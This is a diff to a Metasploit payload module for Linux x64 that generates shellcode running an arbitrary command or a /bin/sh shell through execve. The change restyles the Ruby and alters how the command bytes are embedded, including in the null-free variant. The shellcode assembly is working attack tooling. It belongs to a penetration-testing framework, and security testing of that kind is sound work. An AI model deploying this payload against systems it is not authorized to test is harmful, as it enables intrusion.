@@ -4,34 +4,42 @@
 ##
 
 module MetasploitModule
-
   CachedSize = 44
 
   include Msf::Payload::Single
   include Msf::Payload::Linux::X64::Prepends
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Linux Execute Command',
-      'Description'   => 'Execute an arbitrary command or just a /bin/sh shell',
-      'Author'        => ['ricky',
-                          'Geyslan G. Bem <geyslan[at]gmail.com>'],
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'linux',
-      'Arch'          => ARCH_X64))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Linux Execute Command',
+        'Description' => 'Execute an arbitrary command or just a /bin/sh shell',
+        'Author' => [
+          'ricky',
+          'Geyslan G. Bem <geyslan[at]gmail.com>'
+        ],
+        'License' => MSF_LICENSE,
+        'Platform' => 'linux',
+        'Arch' => ARCH_X64
+      )
+    )
 
     register_options(
       [
-        OptString.new('CMD',  [ false,  "The command string to execute" ]),
-      ])
+        OptString.new('CMD', [ false, 'The command string to execute' ]),
+      ]
+    )
     register_advanced_options(
       [
-        OptBool.new('NullFreeVersion', [ true, "Null-free shellcode version", false ])
-      ])
+        OptBool.new('NullFreeVersion', [ true, 'Null-free shellcode version', false ])
+      ]
+    )
   end
 
-  def generate(opts={})
-    cmd             = datastore['CMD'] || ''
+  def generate(_opts = {})
+    cmd = datastore['CMD'] || ''
+    cmd_length = cmd.bytesize
     nullfreeversion = datastore['NullFreeVersion']
 
     if cmd.empty?
@@ -83,21 +91,25 @@ module MetasploitModule
       # Dynamically builds the exec payload based on the user's options.
       # execve("/bin/sh", ["/bin/sh", "-c", "CMD"], NULL)
       #
-      pushw_c_opt = "dd 0x632d6866" # pushw 0x632d (metasm doesn't support pushw)
+      pushw_c_opt = 'dd 0x632d6866' # pushw 0x632d (metasm doesn't support pushw)
 
       if nullfreeversion
-        if cmd.length > 0xffff
-          raise RangeError, "CMD length has to be smaller than %d" % 0xffff, caller()
+        if cmd_length > 0xffff
+          raise RangeError, 'CMD length has to be smaller than %d' % 0xffff, caller
         end
-        if cmd.length <= 0xff # 255
-          breg = "bl"
+
+        # Null-free: raw bytes without terminator (patched at runtime)
+        cmd_bytes = Metasm::Shellcode.define_data(cmd)
+        if cmd_length <= 0xff # 255
+          breg = 'bl'
         else
-          breg = "bx"
-          if (cmd.length & 0xff) == 0 # let's avoid zeroed bytes
-            cmd += " "
+          breg = 'bx'
+          if (cmd_length & 0xff) == 0 # let's avoid zeroed bytes
+            cmd_bytes += ', 0x20'
+            cmd_length += 1
           end
         end
-        mov_cmd_len_to_breg = "mov #{breg}, #{cmd.length}"
+        mov_cmd_len_to_breg = "mov #{breg}, #{cmd_length}"
 
         # 48 bytes without cmd (null-free)
         payload = <<-EOS
@@ -136,9 +148,11 @@ module MetasploitModule
             syscall                 ; execve("//bin/sh", ["//bin/sh", "-c", "*CMD*"], NULL)
           tocall:
             call afterjmp
-            db "#{cmd}"             ; arbitrary command
+            #{cmd_bytes}                  ; arbitrary command
         EOS
       else
+        # Non-null-free: null-terminated cstring
+        cmd_cstring = Metasm::Shellcode.define_cstring(cmd)
         # 37 bytes without cmd (not null-free)
         payload = <<-EOS
             mov rax, 0x68732f6e69622f
@@ -155,7 +169,7 @@ module MetasploitModule
 
             push rdx                ; NULL
             call continue
-            db "#{cmd}", 0x00       ; arbitrary command
+            #{cmd_cstring}            ; arbitrary command
           continue:
             push rsi                ; "-c"
             push rdi                ; "/bin/sh"
